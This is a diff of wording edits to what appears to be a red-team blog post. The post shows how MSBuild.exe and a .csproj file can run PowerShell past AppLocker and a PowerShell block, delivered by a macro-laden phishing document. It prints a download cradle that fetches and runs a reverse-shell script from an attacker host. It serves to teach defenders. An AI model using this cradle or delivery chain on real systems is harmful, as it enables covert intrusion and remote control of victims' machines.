@@ -9,25 +9,25 @@ published: true
 
 People click, and so simulated phishing campaigns and user awareness training are extremely important. However, there can never be complete assurance against credential divulgence or execution of malicious code via crafted (or not so crafted) phishing attacks, and so it is critical that organisations implement a multi-layered "defence in depth" strategy. Application whitelisting is an important component of such a strategy, and is an effective means of ensuring that only approved applications can run.
 
-AppLocker is a commonly used whitelisting technology and is built into Windows. The default AppLocker rules for Windows 10 are listed below.
+AppLocker is a commonly used whitelisting technology and is built into Windows. Commonly, the default AppLocker rules (listed below) are applied.
 
 ![rules]({{ site.url }}/images/applocker-default-rules.png){: .center-image }
 
-Since Powershell has gained recognition for being the attackers language of choice, many organisations are [increasingly] additionally blocking it. However, blocking powershell.exe is often not sufficient and there are many methods by which PowerShell can be instantiated to send a reverse shell reaching out of the organisation to an attacker.
+Since Powershell has gained recognition for being the attackers language of choice, many organisations are [increasingly] blocking it. However, blocking powershell.exe alone is not sufficient as there are many methods by which PowerShell can be instantiated to send a reverse shell reaching out of the organisation to an attacker.
 
 The post will document one such method, with the "misplaced trust binary" (as Casey Smith puts it) MSBuild.exe. In this scenario, the company has enabled AppLocker with default rules and has also blocked Powershell.
 
 ![rules]({{ site.url }}/images/applocker-rules.png){: .center-image }
 
-We can pass a ".csproj" (Visual Studio .NET C# Project file) to MSBuild and have it execute C# and instantiate a Powershell runspace using the System.Management.Automation.dll assembly. The powashell.csproj file below by Casey Smith ([@SubTee](https://twitter.com/subtee)) builds upon Jared Atkinson's ([@jaredcatkinson](https://twitter.com/jaredcatkinson)) and Justin Warner's ([@sixdub](https://twitter.com/sixdub)) work.
+However, assuming that MSBuild.exe is allowed, we can pass a ".csproj" (Visual Studio .NET C# Project file) to it and have it execute C# and instantiate a Powershell runspace using the System.Management.Automation.dll assembly. The powashell.csproj file below by Casey Smith ([@SubTee](https://twitter.com/subtee)) builds upon Jared Atkinson's ([@jaredcatkinson](https://twitter.com/jaredcatkinson)) and Justin Warner's ([@sixdub](https://twitter.com/sixdub)) work.
 
 <script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>
 
-This executes the second (and final) stage of the payload via a PowerShell 3.0+ download cradle:
+This executes the second stage of the payload via a PowerShell 3.0+ download cradle:
 
 `pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`
 
-Shell.ps1:
+shell.ps1:
 
 <script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>
 
@@ -43,9 +43,9 @@ Our FailedPayment.doc lure:
 
 ![lure]({{ site.url }}/images/phishing-lure.png){: .center-image }
 
-Now that our "malicious" document has been created we can test it out.
+Now that the "malicious" document has been created we can test it out.
 
-Once the user opens the document and enables macros, the powashell.csproj is downloaded for MSBuild to execute, which in turn downloads and executes the Powershell reverse shell one-liner. All completely invisible to the user.
+Once the user opens the document and enables macros, our powashell.csproj is downloaded for MSBuild to execute, which in turn downloads and executes the Powershell reverse shell one-liner. All completely invisible to the user.
 
 ![rules]({{ site.url }}/images/shell.png){: .center-image }
 
@@ -63,7 +63,7 @@ However, there are multiple methods an attacker could use to instantiate a Power
 
 ... and so the back and forth attacker/defender dance continues :)
 
-An "assume breach" mentality is paramount, but before compromise we have to make it as hard as possible for an attacker to gain that foothold.
+Ultimately, an "assume breach" mentality is paramount, but before compromise we have to make it as hard as possible for an attacker to gain that initial foothold.
 
 
 
